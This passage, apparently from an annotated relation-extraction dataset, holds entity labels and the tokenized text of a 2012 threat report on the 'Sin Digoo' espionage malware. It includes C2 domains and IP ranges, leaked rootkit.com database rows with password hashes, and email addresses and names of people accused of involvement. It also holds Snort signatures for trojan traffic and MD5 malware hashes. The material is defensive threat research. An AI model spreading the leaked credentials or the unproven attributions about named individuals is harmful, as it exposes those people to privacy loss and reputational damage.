"114248800", "sent_id": 43, "pos": []}, {"old_id": "T26", "type": "Address", "name": "114248960", "sent_id": 43, "pos": []}, {"old_id": "T24", "type": "Address", "name": "123120960", "sent_id": 43, "pos": []}, {"old_id": "T27", "type": "Indicator", "name": "asia-onlineus", "sent_id": 45, "pos": []}, {"old_id": "T28", "type": "Malware", "name": "RegSubsDat", "sent_id": 45, "pos": [1]}, {"old_id": "T29", "type": "Email", "name": "king_public@hotmailcom", "sent_id": 45, "pos": []}, {"old_id": "T30", "type": "Indicator", "name": "Cyb3rsleuth", "sent_id": 46, "pos": []}, {"old_id": "T31", "type": "Person", "name": "Wang Liang Chen", "sent_id": 46, "pos": []}, {"old_id": "T32", "type": "Account", "name": "jeno_1980@hotmailcom", "sent_id": 51, "pos": []}, {"old_id": "T33", "type": "Host", "name": "socialupnet", "sent_id": 51, "pos": []}, {"old_id": "T34", "type": "Attacker", "name": "blackhat", "sent_id": 55, "pos": []}, {"old_id": "T35", "type": "Indicator", "name": "jzd", "sent_id": 64, "pos": [17]}, {"old_id": "T36", "type": "Host", "name": "i-tobuycom", "sent_id": 66, "pos": []}, {"old_id": "T37", "type": "Account", "name": "jeno_1980@hotmailcom", "sent_id": 66, "pos": []}, {"old_id": "T38", "type": "Indicator", "name": "xxgchappy", "sent_id": 66, "pos": []}, {"old_id": "T39", "type": "Host", "name": "1stsalenet", "sent_id": 68, "pos": []}, {"old_id": "T40", "type": "Account", "name": "xxgchappy@vipsinacom", "sent_id": 68, "pos": []}, {"old_id": "T41", "type": "Indicator", "name": "john twk", "sent_id": 68, "pos": []}, {"old_id": "T42", "type": "Exploit", "name": "hooking Windows API functions", "sent_id": 74, "pos": [42, 45]}, {"old_id": "T43", "type": "Indicator", "name": "Jeno", "sent_id": 79, "pos": []}, {"old_id": "T44", "type": "Address", "name": "12368998", "sent_id": 82, "pos": []}, {"old_id": "T45", "type": "Email", "name": "king_public@hotmailcom", "sent_id": 84, "pos": []}, {"old_id": "T46", "type": "Address", "name": "61515963", "sent_id": 85, "pos": []}, {"old_id": "T47", "type": "Indicator", "name": "king-rose", "sent_id": 88, "pos": []}, {"old_id": "T48", "type": "Indicator", "name": "Club-tom", "sent_id": 88, "pos": []}, {"old_id": "T49", "type": "Hash", "name": "e211f11c0b28434bf7f1c8fb510fa9ae", "sent_id": 89, "pos": []}, {"old_id": "T50", "type": "Email", "name": "wzy_100@hotmailcom", "sent_id": 94, "pos": []}, {"old_id": "T51", "type": "Address", "name": "123120127153", "sent_id": 94, "pos": []}, {"old_id": "T52", "type": "Exploit", "name": "lankiller", "sent_id": 105, "pos": [12]}, {"old_id": "T53", "type": "Campaign", "name": "Sin Digoo", "sent_id": 113, "pos": [1, 2]}], "labels": [{"old_id": "R1", "r": "P32", "h": 13, "t": 12, "evidence": [29]}, {"old_id": "R2", "r": "P32", "h": 13, "t": 11, "evidence": [29]}, {"old_id": "R3", "r": "P32", "h": 13, "t": 10, "evidence": [29]}, {"old_id": "R4", "r": "P32", "h": 14, "t": 17, "evidence": [31]}, {"old_id": "R5", "r": "P32", "h": 14, "t": 16, "evidence": [31]}, {"old_id": "R6", "r": "P32", "h": 15, "t": 17, "evidence": [31]}, {"old_id": "R7", "r": "P32", "h": 15, "t": 16, "evidence": [31]}, {"old_id": "R8", "r": "P32", "h": 14, "t": 18, "evidence": [31, 32, 33]}, {"old_id": "R9", "r": "P32", "h": 15, "t": 18, "evidence": [31, 32, 33]}, {"old_id": "R10", "r": "P22", "h": 20, "t": 21, "evidence": [38, 39]}, {"old_id": "R11", "r": "P33", "h": 20, "t": 22, "evidence": [38]}, {"old_id": "R12", "r": "P21", "h": 26, "t": 27, "evidence": [45]}, {"old_id": "R13", "r": "P21", "h": 28, "t": 27, "evidence": [45]}, {"old_id": "R14", "r": "P21", "h": 29, "t": 27, "evidence": []}, {"old_id": "R15", "r": "P4", "h": 31, "t": 32, "evidence": [51]}, {"old_id": "R16", "r": "P4", "h": 36, "t": 35, "evidence": [66]}, {"old_id": "R17", "r": "P4", "h": 39, "t": 38, "evidence": [68]}, {"old_id": "R18", "r": "P22", "h": 52, "t": 51, "evidence": []}], "title": ["inputs/txt/201202DellSecureWorksSinDigoo"], "sents": [["The", "Sin", "Digoo", "Affair"], ["URL:http://www", ".", "secureworks.com/research/threats/sindigoo/"], ["Date:", "29", "February", "2012"], ["Author:", "Joe", "Stewart", ",", "Director", "of", "Malware", "Research", ",", "Dell", "SecureWorks", "Counter", "Threat", "Unit", "Research", "Team"], ["\"We", "cannot", "enter", "into", "informed", "alliances", "until", "we", "are", "acquainted", "with", "the", "designs", "of", "our", "neighbors", "and", "the", "plans", "of", "our", "adversaries", ".", "\"", "-", "Sun", "Tzu", ",", "The", "Art", "of", "War"], ["Introduction"], ["The", "story", "of", "the", "Sin", "Digoo", "affair", "begins", "with", "a", "set", "of", "Internet", "domain", "registrations", "dating", "back", "to", "2004", ".", "Between", "2004", "and", "2011", ",", "a", "person", "using"], ["the", "email", "address", "jeno_1980@hotmail", ".", "com", "registered", "several", "domains", "using", "the", "names", "\"Tawnya", "Grilth\"", "and", "\"Eric", "Charles\"", ".", "Curiously", ",", "all", "of"], ["the", "\"Tawnya", "Grilth\"", "domains", "showed", "the", "registrant's", "physical", "address", "to", "be", "a", "post", "office", "box", "in", "the", "fictional/misspelled", "town", "of", "\"Sin", "Digoo\"", ","], ["California", "."], ["Figure", "1", ".", "Characteristics", "of", "domains", "registered", "by", "jeno_1980@hotmail", ".", "com."], ["In", "2006", "and", "2007", ",", "jeno_1980@hotmail", ".", "com", "registered", "a", "number", "of", "domains", "under", "the", "\"Tawnya", "Grilth\"", "alias", "that", "have", "appeared", "repeatedly", "on"], ["reports", "published", "by", "various", "automated", "malware", "analysis", "systems", "and", "antivirus", "websites", ".", "The", "Dell", "SecureWorks", "CTUSM", "research", "team", "examined", "malware", "samples", "using", "these", "domains", "and", "concluded", "that", "these", "domains", "were", "involved", "in", "a", "larger", "pattern", "of", "malware-based", "espionage", ",", "sometimes", "referred", "to", "as", "Advanced", "Persistent", "Threat", "(APT)", "activity", "."], ["Espionage", "malware"], ["There", "are", "two", "primary", "malware", "families", "involved", "with", "the", "Sin", "Digoo", "domains", ".", "One", "is", "known", "as", "\"Enfal\"", ",", "which", "is", "short", "for", "\"EtenFalcon\"", ",", "a"], ["string", "found", "inside", "early", "samples", ".", "The", "involvement", "of", "actors", "using", "this", "malware", "for", "espionage", "was", "first", "detailed", "in", "2010", "in", "a", "joint", "report", "by", "the"], ["Information", "Warfare", "Monitor", "and", "the", "Shadowserver", "Foundation", ".", "The", "report", ",", "titled", "\"Shadows", "in", "the", "Cloud:", "Investigating", "Cyber", "Espionage"], ["2", ".", "0,\"", "was", "a", "continuation", "of", "research", "from", "an", "earlier", "report", "titled", "\"Tracking", "GhostNet:", "Investigating", "a", "Cyber", "Espionage", "Network", ".", "\"", "A", "later", "report"], ["by", "antivirus", "firm", "Trend", "Micro", "titled", "\"The", "LURID", "Downloader\"", "further", "details", "a", "campaign", "of", "espionage", "by", "this", "malware", "against", "targets", "worldwide", "."], ["Figure", "2", ".", "Sin", "Digoo", "connection", "to", "Enfal", "malware", "."], ["A", "second", "family", "of", "malware", "connecting", "to", "the", "\"Tawnya", "Grilth\"", "domains", "is", "less", "well-known", ",", "although", "a", "couple", "of", "antivirus", "companies", "have"], ["used", "the", "names", "\"RegSubsDat\"", ",", "\"RegSubDat\"", "or", "\"Kirpich\"", "to", "refer", "to", "it", ".", "A", "recent", "variant", "was", "described", "by", "the", "information", "security", "firm", "CyberESI", "in", "a", "2011", "blog", "post", "titled", "\"India-United", "States", "Naval", "Cooperation", ".", "doc", "Analysis", ".", "\"", "Details", "regarding", "the", "earlier", "variant", "used", "in", "the", "Sin", "Digoo"], ["activity", "was", "first", "analyzed", "in", "a", "blog", "posting", "by", "Don", "C", ".", "Weber", "titled", "\"Malware", "Characteristics", "Report", "-", "Trojan", ".", "RegSubsDat.A\"", "on", "his", "Security"], ["Ripcord", "blog", "."], ["Figure", "3", ".", "Sin", "Digoo", "connection", "to", "RegSubsDat", "malware"], ["Although", "windowsaupdate", ".", "com", "is", "not", "a", "\"Tawnya", "Grilth\"", "domain", "according", "to", "the", "WHOIS", "data", ",", "the", "name", "is", "almost", "certainly", "related", "to", "the", "domain", "windowsaupdate", ".", "net,", "especially", "given", "the", "same", "subdomain", "naming", "pattern", "(e", ".", "g.,", "v4", ",", "v12", ",", "v14)", "."], ["Victim", "discovery"], ["CTU", "analysts", "sinkholed", "a", "number", "of", "the", "\"Tawnya", "Grilth\"", "domains", "in", "2011", "and", "2012", ".", "Traffic", "from", "infected", "victim", "computers", "is", "now", "sent", "to"], ["servers", "that", "log", "connections", ",", "gather", "statistics", ",", "and", "notify", "victims", "when", "possible", ".", "The", "initial", "findings", "from", "the", "sinkholing", "activity", "are:"], ["1", ".", "Between", "100", "and", "200", "computers", "located", "in", "Vietnam", ",", "Brunei", ",", "and", "Myanmar", "are", "infected", "by", "RegSubsDat", ".", "Analysis", "of", "the", "IP", "addresses", "connecting", "to", "the", "sinkhole", "show", "that", "many", "are", "government", "ministries", ".", "Additionally", ",", "more", "than", "one", "regional", "petroleum", "company", "and", "a"], ["newspaper", "has", "been", "infected", "."], ["2", ".", "A", "handful", "of", "victim", "computers", "in", "Europe", "and", "the", "Middle", "East", "are", "infected", "by", "RegSubsDat", ",", "Enfal", ",", "and", "one", "other", "unknown", "trojan", ".", "These"], ["computers", "belong", "to", "government", "ministries", "in", "different", "countries", ",", "an", "embassy", ",", "a", "nuclear", "safety", "agency", ",", "and", "other", "business-related"], ["groups", ".", "Additionally", ",", "there", "is", "an", "embassy", "located", "inside", "mainland", "China", "that", "is", "infected", "."], ["The", "CTU", "researchers", "have", "notified", "many", "of", "the", "national", "computer", "security", "incident", "response", "teams", "(CSIRTs)", "in", "the", "countries", "where", "infections"], ["were", "detected", "and", "are", "continuing", "this", "notification", "process", ".", "The", "notifications", "include", "the", "necessary", "information", "to", "locate", "victims", "within", "the"], ["country", ",", "inform", "the", "victims", ",", "and", "mitigate", "the", "infections", "."], ["Link", "to", "RSA", "breach"], ["In", "addition", "to", "the", "GhostNet", "link", ",", "connections", "can", "also", "be", "drawn", "between", "the", "malware", "used", "in", "the", "Sin", "Digoo", "activity", "and", "the", "RSA", "breach", "revealed", "in", "early", "2011", ".", "According", "to", "the", "US-CERT", "EWIN-11-077", "bulletin", ",", "a", "number", "of", "command-and-control", "(C2)", "hostnames", "used", "by", "RegSubsDat", "shared", "three", "different", "IP", "addresses", "at", "different", "points", "in", "time", ",", "with", "one", "of", "the", "hostnames", "known", "to", "be", "part", "of", "the", "RSA", "breach", ".", "This", "C2"], ["hostname", "was", "used", "in", "a", "piece", "of", "malware", "known", "as", "\"Murcy\"", ",", "which", "was", "detailed", "in", "\"Command", "and", "Control", "in", "the", "Fifth", "Domain", ",", "\"", "a", "2012", "report", "by", "Command", "Five", "Pty", "Ltd", "."], ["Figure", "4", ".", "Connection", "between", "the", "RegSubsDat", "malware", "and", "the", "Murcy", "malware", "."], ["All", "three", "IP", "addresses", "belong", "to", "the", "China", "Beijing", "Province", "Network", "(AS4808)", ".", "Although", "the", "RegSubsDat", "and", "Murcy", "C2s", "shared", "these", "IPs", "a"], ["few", "months", "apart", ",", "the", "fact", "that", "three", "IP", "different", "addresses", "at", "the", "same", "ISP", "overlapped", "in", "a", "short", "time", "frame", "seems", "to", "indicate", "shared", "infrastructure", "used", "by", "both", "the", "RSA", "breach", "actors", "and", "other", "actors", "using", "the", "RegSubsDat", "malware", ".", "AS4808", "is", "known", "for", "many", "other", "connections", "to"], ["malware", "and", "is", "considered", "by", "some", "to", "be", "a", "hotbed", "of", "espionage", "C2s", ",", "especially", "the", "123", ".", "120.96.0/19,", "114", ".", "248.80.0/20", "and", "114", ".", "248.96.0/20", "subnets", ".", "These", "subnets", "have", "been", "seen", "in", "DNS", "records", "for", "hundreds", "of", "C2", "hostnames", "for", "dozens", "of", "custom", "malware", "families", ",", "either", "known", "for", "or"], ["suspected", "in", "espionage", "activity", "."], ["The", "RegSubsDat", "asia-online", ".", "us", "domain", "was", "registered", "by", "an", "unknown", "actor", "using", "the", "email", "address", "king_public@hotmail", ".", "com.", "A", "2011", "blog"], ["posting", "by", "\"Cyb3rsleuth\"", "traced", "this", "email", "address", "to", "a", "social", "media", "profile", "created", "by", "a", "person", "living", "in", "Beijing", "named", "\"Wang", "Liang", "Chen", ".", "\""], ["The", "same", "email", "address", "was", "used", "to", "register", "many", "other", "RegSubsDat", "domains", "as", "well", ".", "The", "social", "media", "profile", "for", "king_public@hotmail", ".", "com"], ["has", "since", "been", "deleted", "."], ["Tracking", "Tawnya"], ["The", "same", "type", "of", "open-source", "intelligence", "can", "be", "used", "to", "gather", "information", "about", "the", "jeno_1980@hotmail", ".", "com", "actor", ".", "One", "domain", "registered"], ["by", "jeno_1980@hotmail", ".", "com", "is", "\"socialup", ".", "net\".", "This", "site", "describes", "a", "\"like", "exchange", ",", "\"", "which", "is", "a", "service", "that", "Internet", "marketers", "can", "use", "to", "promote"], ["a", "story", "on", "social", "media", "sites", "like", "Digg", "or", "Reddit", "."], ["Figure", "5", ".", "Screenshot", "of", "the", "socialup", ".", "net", "interface", "."], ["This", "type", "of", "service", "falls", "under", "the", "category", "of", "\"blackhat", "SEO", ",", "\"", "a", "term", "for", "a", "variety", "of", "techniques", "for", "manipulating", "search", "engines", "and", "social"], ["media", "sites", "for", "marketing", "purposes", ".", "These", "methods", "are", "considered", "\"blackhat\"", "because", "they", "usually", "lead", "to", "a", "site", "or", "user", "being", "banned", "from"], ["the", "search", "engine", "or", "social", "media", "sites", "if", "the", "manipulation", "is", "discovered", "."], ["The", "socialup", ".", "net", "website", "has", "been", "repeatedly", "promoted", "on", "blackhat", "SEO", "message", "boards", "by", "various", "personas", ",", "including", "one", "named"], ["\"Tawnya\"", "."], ["Figure", "6", ".", "Example", "of", "\"Tawnya\"", "promoting", "socialup", ".", "net."], ["Once", "a", "user", "signs", "up", "with", "socialup", ".", "net,", "they", "can", "earn", "virtual", "\"coins", ".", "\"", "The", "coins", "can", "be", "used", "to", "promote", "the", "user's", "websites", "or", "social", "media"], ["posts", ",", "either", "by", "viewing", "ads", "or", "liking", "other", "users'", "stories", "and", "links", ".", "A", "user", "can", "also", "buy", "coins", "from", "the", "owner", "of", "socialup", ".", "net", "using", "PayPal", "."], ["Figure", "7", ".", "Example", "of", "interface", "to", "purchase", "coins", "."], ["As", "part", "of", "the", "PayPal", "transaction", ",", "the", "potential", "customer", "can", "see", "the", "payee", "email", "address", ".", "In", "the", "case", "of", "socialup", ".", "net,", "PayPal's", "website", "shows"], ["that", "the", "payment", "for", "the", "socialup", ".", "net", "coins", "is", "sent", "to", "an", "individual", "with", "the", "initials", "jzd", "."], ["Figure", "8", ".", "Order", "summary", "for", "coins", "showing", "payee", "information", "."], ["One", "of", "the", "other", "\"Tawnya", "Grilth\"", "domains", "is", "\"i-tobuy", ".", "com\".", "This", "domain", "was", "registered", "in", "2004", "using", "the", "jeno_1980@hotmail", ".", "com", "email", "address", "and", "\"Sin", "Digoo\"", "location", ",", "but", "the", "nickname", "\"xxgchappy\"", "is", "also", "shown", "in", "the", "registrant", "contact", "data", "."], ["Figure", "9", ".", "Registrant", "contact", "data", "for", "i-tobuy", ".", "com."], ["Another", "domain", "registered", "in", "2004", "using", "the", "\"Sin", "Digoo\"", "location", "was", "\"1stsale", ".", "net\",", "registered", "to", "a", "\"john", "twk\"", "with", "the", "email", "address", "xxgchappy@vip", ".", "sina.com."], ["Figure", "10", ".", "Registrant", "contact", "data", "for", "1stsale", ".", "net."], ["There", "is", "a", "profile", "on", "a", "Chinese", "programmers'", "forum", "for", "an", "\"xxgchappy\"", "user", "who", "has", "posted", "two", "different", "email", "addresses", "in", "different", "messages", "on", "the", "site", ".", "These", "addresses", "are", "xxgchappy@vip", ".", "sina.com", "and"], ["@sina", ".", "com.cn", "(address", "redacted)", ".", "The", "user's", "name", "is", "listed", "on", "the", "forum's", "profile", "page", "for", "\"xxgchappy\"", "and", "contains", "the", "initials", "ZD", "."], ["Figure", "11", ".", "Profile", "for", "xxgchappy", "."], ["Figure", "12", ".", "Tracing", "the", "connections", "between", "socialup", ".", "net,", "i-tobuy", ".", "com,", "and", "1stsale", ".", "net."], ["Several", "clues", "on", "the", "Internet", "point", "to", "xxgchappy", ",", "or", "ZD", ",", "having", "a", "working", "knowledge", "of", "computer", "programming", ".", "The", "use", "of", "the", "programmers'", "forum", ",", "along", "with", "postings", "to", "that", "site", ",", "indicates", "he", "is", "interested", "in", "code", "related", "to", "hooking", "Windows", "API", "functions", ",", "a", "common", "technique", "used", "in", "malware", ".", "Additionally", ",", "both", "xxgchappy@vip", ".", "sina.com", "and", "king_public@hotmail", ".", "com", "were", "the", "listed", "email", "addresses", "for", "users"], ["of", "the", "\"rootkit", ".", "com\"", "site", ",", "revealed", "when", "that", "site's", "database", "was", "leaked", "in", "2011", "."], ["A", "\"rootkit\"", "is", "a", "program", "used", "for", "hiding", "traces", "of", "malware", "on", "a", "system", ",", "and", "rootkit", ".", "com", "was", "a", "forum", "for", "discussing", "the", "latest", "rootkit", "technolo-"], ["gies", ".", "However", ",", "simply", "having", "an", "account", "on", "rootkit", ".", "com", "does", "not", "imply", "one", "is", "using", "rootkits", "offensively", "\u2014", "many", "anti-malware", "researchers"], ["were", "also", "members", "of", "the", "site", ".", "There", "are", "some", "interesting", "clues", "in", "the", "database", "table", "for", "both", "users", "."], ["The", "nickname", "\"Jeno\"", "appears", "again", "in", "the", "rookit", ".", "com", "user", "database", "entry", "for", "the", "user", "with", "the", "email", "address", "xxgchappy@vip", ".", "sina.com."], ["(7523", ",", "'Jeno','91cec994','Jeno", "Alix','xxgchappy@vip", ".", "sina.com',1,0,"], ["'','','','','','',0,'http://www", ".", "rootkit.com/usericons/Jeno.jpg',''"], [",1265784473,'123", ".", "6.89.98',0,0,0,1265721022,0,0,0,'','0','','','',-1,''),"], ["(23025", ",", "'king-rose','e211f11c0b28434bf7f1c8fb510fa9ae','Club-tom',"], ["'king_public@hotmail", ".", "com',1,1106582903,'','','','','','',0,'',''"], [",1106837367,'61", ".", "51.59.63',0,0,0,1106583113,0,0,0,'BH','19800126',"], ["''", ",", "'','',0,''),"], ["Figure", "13", ".", "Database", "entries", "with", "the", "xxgchappy", "and", "king_public", "email", "addresses", "."], ["In", "the", "entry", "for", "king_public@hotmail", ".", "com,", "we", "see", "the", "nicknames", "\"king-rose\"", "and", "\"Club-tom\"", ",", "but", "even", "more", "interesting", "is", "the", "password", "hash"], ["\"e211f11c0b28434bf7f1c8fb510fa9ae\"", ".", "This", "password", "hash", "appears", "in", "only", "one", "other", "entry", "in", "the", "rootkit", ".", "com", "database:"], ["(20446", ",", "'king-z','e211f11c0b28434bf7f1c8fb510fa9ae','k,z,y',"], ["'wzy_100@hotmail", ".", "com',1,1097652186,'','','','','','',0,'','',1284013010,"], ["'123", ".", "120.127.153',0,0,0,1284013010,0,0,0,'','','','','',0,''),"], ["Figure", "14", ".", "Other", "appearance", "of", "the", "password", "hash", "associated", "with", "king_public@hotmail", ".", "com."], ["From", "this", "evidence", ",", "we", "can", "deduce", "that", "\"king-z\"", "is", "a", "second", ",", "earlier", "account", "of", "king_public@hotmail", ".", "com,", "created", "using", "the", "wzy_100@hotmail", ".", "com", "email", "address", ".", "Even", "more", "interesting", "is", "the", "123", ".", "120.127.153", "IP", "address", "the", "king-z", "account", "used", "to", "log", "in", ".", "This", "IP", "is", "located", "inside", "one"], ["of", "the", "AS4808", "netblocks", "famous", "for", "espionage", "activity", ".", "In", "fact", ",", "it", "is", "remarkably", "close", "to", "123", ".", "120.127.159,", "an", "IP", "used", "by", "Enfal", "C2", "v2", ".", "windowsaupdate.net", "(one", "of", "the", "\"Tawnya", "Grilth\"", "domains)", "on", "September", "27", ",", "2010", ".", "The", "last", "account", "activity", "for", "king-z", "as", "shown", "in", "the", "rootkit", ".", "com"], ["database", "is", "September", "9", ",", "2010", ".", "This", "data", "strongly", "suggests", "that", "king_public@hotmail", ".", "com", "is", "not", "just", "a", "stolen", "account", "used", "to", "register", "a", "domain", ","], ["but", "that", "the", "user", "is", "involved", "in", "the", "espionage", "network", "in", "some", "manner", "."], ["The", "password", "used", "by", "xxgchappy@vip", ".", "sina.com", "does", "not", "appear", "elsewhere", "in", "the", "leaked", "rootkit", ".", "com", "database;", "however", ",", "another", "leaked", "database", "may", "provide", "additional", "clues", "surrounding", "the", "xxgchappy", "personality", "."], ["The"], ["@sina", ".", "com.cn", "(address", "redacted)", "email", "address", "associated", "with", "the", "user", "xxgchappy", "can", "be", "found", "inside", "an", "archive", "posted", "to", "the"], ["\"hackchina", ".", "com\"", "website", "."], ["xxgchappy", "#", "2710", "#"], ["@sina", ".", "com.cn"], ["Figure", "15", ".", "xxgchappy", "reference", "from", "the", "hackchina", ".", "com", "website", "."], ["The", "archive", "contains", "a", "denial-of-service", "attack", "tool", "called", "\"lankiller\"", ".", "Inside", "the", "lankiller", "binary", "is", "the", "following", "comment:"], ["Designed", "for", "lyh", "by", "xxgc-happy", "2002", ".", "3.8"], ["Figure", "16", ".", "Reference", "to", "xxgc-happy", "in", "the", "lankiller", "tool", "."], ["Also", "included", "in", "the", "lankiller", "archive", "is", "a", "README", "file", "that", "describes", "the", "use", "of", "the", "tool", ".", "It", "asks", "the", "user", "to", "email", "the", "author", "at", "either"], ["@sina", ".", "com.cn", "or", "happy@sohu", ".", "com.cn."], ["Figure", "17", ".", "Email", "addresses", "referenced", "in", "the", "lankiller", "README", "file", "."], ["There", "is", "a", "profile", "for", "\"happy\"", "on", "a", "Chinese", "video", "site", "showing", "a", "possible", "photo", "of", "the", "user", ".", "The", "photo", "is", "of", "a", "man", "who", "appears", "to", "be", "in", "his", "early", "twenties", "and", "of", "Asian", "descent", "."], ["Conclusion"], ["The", "Sin", "Digoo", "activity", "is", "only", "a", "limited", "view", "into", "a", "very", "large", "amount", "of", "espionage-by-malware", "that", "is", "happening", "in", "the", "world", ".", "The", "Enfal", ","], ["RegSubsDat", ",", "and", "Murcy", "malware", "families", "possess", "dozens", "of", "defunct", "and", "active", "C2s", ",", "and", "these", "three", "trojans", "are", "only", "a", "tiny", "subset", "of", "the", "malware", "families", "the", "Dell", "SecureWorks", "CTU", "research", "team", "knows", "to", "be", "involved", "in", "espionage", "activity", ".", "Collaboration", "between", "government", ",", "espionage", "malware", "victims", ",", "and", "the", "computer", "security", "industry", "must", "improve", "to", "better", "defend", "against", "this", "undercurrent", "of", "activity", "that", "threatens"], ["to", "undermine", "an", "already", "weakened", "economy", "in", "countries", "around", "the", "world", "."], ["Appendix", "A", "\u2013", "Network", "IDS", "signatures"], ["alert", "tcp", "$HOME_NET", "any", "->", "any", "any", "(msg:\"Enfal", "Trojan", "Activity\";", "flow:established", ",", "to_server;", "content:\"GET|20|\";", "depth:4;"], ["pcre:\"/^GET\\x20", ".", "*\\x2ftrandocs\\x2fnetstate*\\x20HTTP\\x2f1/\";"], ["reference:url,www", ".", "secureworks.com/research/threats/sindigoo/;"], ["sid:1111111111;)"], ["alert", "tcp", "$HOME_NET", "any", "->", "any", "any", "(msg:\"Enfal", "Trojan", "Activity\";", "flow:established", ",", "to_server;", "content:\"GET|20|\";", "depth:4;"], ["pcre:\"/^GET\\x20", ".", "*\\x2f(category2|data\\x2fforum|httpdocs\\x2fmm|trandocs\\x2fmm).*[A-F0-9]{2}\\x2d[A-F0-9]{2}\\x2d[A-F0-9]{2}\\x2d[AF0-9]{2}\\x2d[A-F0-9]{2}\\x2d[A-F0-9]"], ["{2}\\x2f(showNumber|WindowTask|ORDERTIP|ComMand\\x2esec|Cmwhite|ComMand\\x2esec|Command", ".", "txt|Query.txt|sunrise|Tiblue|Trblu"], ["reference:url,www", ".", "secureworks.com/research/threats/sindigoo/;", "sid:1111111112;)"], ["alert", "tcp", "$HOME_NET", "any", "->", "any", "any", "(msg:\"Enfal", "Trojan", "Activity\";", "flow:established", ",", "to_server;", "content:\"POST|20|\";", "depth:5;"], ["content:", "!", "\"|0a|Referer|3a20|\";"], ["pcre:\"/^POST\\x20", ".", "*\\x2fcg[az]\\x2dbin\\x2f(Clnpp5|CMS_ClearAll|CMS_ListImg|CMS_SubitAll|dieosn83|Dskx8|Htrc3|Info|Owpp4|Owpq4|Rwpq1|Trpq8|Trpq8|vip)\\x"], ["reference:url,www", ".", "secureworks.com/research/threats/sindigoo/;", "sid:1111111113;)"], ["alert", "tcp", "$HOME_NET", "any", "->", "any", "any", "(msg:\"Enfal", "Trojan", "Activity\";", "flow:established", ",", "to_server;", "content:\"POST|20|\";", "depth:5;"], ["pcre:\"/^POST\\x20", ".", "*\\d{6,12}\\x2ephp\\x20HTTP\\x2f1.*\\r\\n\\r\\n[a-z0-9\\x2d]{4,15}\\x3a[A-F0-9]{2}\\x2d[A-F0-9]{2}\\x2d[A-F0-9]{2}\\x2d[A-F09]{2}\\x2d[A-F0-9]{2}\\x2d[A-F0-9]{2}/s\";", "reference:url,www", ".", "secureworks.com/research/threats/sindigoo/;", "sid:1111111114;)"], ["alert", "tcp", "$HOME_NET", "any", "->", "any", "any", "(msg:\"RegSubsDat", "Trojan", "Activity\";", "flow:established", ",", "to_server;", "content:\"POST|20|\";", "depth:5;"], ["content:\"|2f|log|20|HTTP|2f|1\";"], ["pcre:\"/^POST\\x20", ".", "*\\x2f[A-F0-9]{6}0000\\x2flog\\x20HTTP\\x2f1/\";"], ["reference:url,www", ".", "secureworks.com/research/threats/sindigoo/;", "sid:1111111115;)"], ["Appendix", "B", "\u2013", "Malware", "hashes"], ["MD5", "signatures", "for", "Enfal"], ["0144f8d76662fc382b8eb094eb347e4b"], ["01a5adace93ad5afac400f9589b62607"], ["027d7db3d2a94bb0dfadc71300aaee3e"], ["02857b2b6cc5aa750dbfb6a1088a5239"], ["035f2e58144209ea9973bbe4cad58e15"], ["04cb272bbe383707574005a2999f2fe0"], ["054688eb39ea0cd380bb89b6746abc4f"], ["06572d93d87a8d0fb7e070be79692c87"], ["066be8f9e08acfe8ab1eecb884a73801"], ["071d01bcaadc9df5683a6cfa81736714"], ["084e99653956350210beb13c8ea43c79"], ["09c44fcceb51f9affdb63b0d8f9e4b31"], ["0a5446da47609868101c773e928b36e4"], ["0bbd1f253e928cafa3c9c78cdaa849bd"], ["0c589418274ba97663853d1c6bef3bd1"], ["0ecd791525cc30ced610e81ef67290b0"], ["0ed85a30083fb71452916e14a4b5936a"], ["10162681b64c72834621c6fd68b6501f"], ["106db67336a318b6ee4f3197027df85c"], ["113a066b19737b59ab1e2ad921cf3a03"], ["113bea934d89d0cfdc445489f0eb713d"], ["11696e0f7399986c4978e35f3160c22b"], ["1175fff7b282db3b2b0c8c9517bcd937"], ["11cf5c71ddf9a666d9b470dff21c4ec5"], ["13d82eaadf0a5f6fd2d76b66673efa91"], ["140c69ea9a963100e75497b33820f1da"], ["164e3c7488b70d6db28cf71cbc72b0c2"], ["173ec685aa9f581a03c30866b5021574"], ["17810c2ad162c4726729b3fc3ae8676e"], ["184f2de39a9fcc0039eb9df09c4e75b8"], ["19cddfee52c7b7adf4d5dd3e98e0b0bd"], ["1c1f7b32d5381335b83af545b9eef101"], ["1c2aab24d699c24cec860e73c767bce7"], ["1e95875e6c0f054b62c94d6063ff9eed"], ["1f91d940c42f216cf95e724a034802db"], ["1fa520329a77d01aaaf5808ddf529ce2"], ["21b761b4401d290b9e02fea87f2a9933"], ["2370a2142bc61c520226d188e102a727"], ["241aaa7d73339c1624a27fcce5d1815d"], ["24decc7e98e67e3a6e5d34f284f79124"], ["25710d277596d09e5607f419eb63e11d"], ["272fffde11c97b31cf9de7c1e1816d61"], ["276495490cf16318735f880785203378"], ["2880436cf619a270e6c31d9da6eb426b"], ["289242778ef037e02106a491de38cc1f"], ["2944e486b252112720098860a91788e0"], ["297158cfce8fc76789ca41899f6047ac"], ["2ae27d10e04d229c937c0363c29ed3e8"], ["2bc74b3aff2fd68eb38820bb0760f3a6"], ["2bfd304e3433cb0de9c2f284e9417409"], ["2f2f61d3b8f5064affb11e67ae6320b2"], ["2fd6e2c7fc80ab9a6be6a0eebd09763e"], ["2fdaa46fff13f87dcc22fb9aef9ba338"], ["300dcc10df87a998b08dddd2dbc55a28"], ["30971caaf134d7706c70335f54e3188f"], ["30d075afef4e518f63c0b43b8c764e12"], ["3270d18157131f216468cf7ce53ee8d1"], ["331140c7ffaea93ed807f86720b5929e"], ["331acc687cf2b93fc7bfed257ea54488"], ["33eb9e349ec9e093c54028e7c1cd8b0a"], ["340c9de8ff62134bb0e51c24c0919576"], ["343cef9a8d83afca81918fc317f3ccb8"], ["3447416fbbc65906bd0384d4c2ba479e"], ["34563d4ccf2fdd8a08b05089d82a803b"], ["347906343329916ace3636a541c96f26"], ["34f53d0b59f7cf352aace044abf95df3"], ["35369bf701904b17725429e8cb938645"], ["35ca158ffd5965d68f7ef64ee527a028"], ["3603c2b0262ed71402fe981991ddd614"], ["367459c45eec216b6858e7b2f91e0c99"], ["36b1f9def6a794ae0be8148d149e5fe7"], ["36d10e8d5e95bcfed701df530de2a917"], ["36dccde0de343af9e7f08128900334f2"], ["36e8c4f5b906e2e4cc3d5e64b79b8642"], ["374b6371918ab0ba91e9f3489e5eab19"], ["39762af48276967a54372dca1f89936c"], ["3b159b70f6f6e66db77dd6b57f04ec2f"], ["3b5fdfff3f49f0231586dd4fcca7c25d"], ["3c1c15ac3b1bf3787137685637e33140"], ["3d176273201bb6f07746cd7c5c46166c"], ["3d69e2b0257cebf9bc1a6f788f45fbcb"], ["3e27d880674149d2548b5b36d22570ff"], 